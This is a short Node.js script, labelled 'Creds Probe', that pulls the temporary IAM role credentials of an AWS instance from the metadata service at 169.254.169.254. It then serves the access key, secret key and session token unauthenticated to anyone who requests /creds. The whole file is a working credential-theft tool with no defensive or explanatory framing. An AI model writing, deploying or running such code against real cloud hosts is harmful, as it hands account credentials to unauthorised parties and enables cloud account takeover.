const http = require("http");

async function getFullCreds() {
  const token = await new Promise((r, j) => {
    const req = http.request({
      hostname: "169.254.169.254", path: "/latest/api/token", method: "PUT",
      headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" }, timeout: 2000
    }, res => { let b = ""; res.on("data", c => b += c); res.on("end", () => r(b)); });
    req.on("error", j); req.end();
  });
  
  const role = await new Promise((r, j) => {
    http.get({ hostname: "169.254.169.254", path: "/latest/meta-data/iam/security-credentials/",
      headers: { "X-aws-ec2-metadata-token": token }, timeout: 2000
    }, res => { let b = ""; res.on("data", c => b += c); res.on("end", () => r(b.trim())); }).on("error", j);
  });
  
  const creds = await new Promise((r, j) => {
    http.get({ hostname: "169.254.169.254", path: "/latest/meta-data/iam/security-credentials/" + role,
      headers: { "X-aws-ec2-metadata-token": token }, timeout: 2000
    }, res => { let b = ""; res.on("data", c => b += c); res.on("end", () => r(JSON.parse(b))); }).on("error", j);
  });
  
  return { role, ...creds };
}

http.createServer(async (req, res) => {
  if (req.url === "/creds") {
    const creds = await getFullCreds();
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(creds, null, 2));
  } else {
    res.writeHead(200);
    res.end("Creds Probe - /creds");
  }
}).listen(process.env.PORT || 3000);
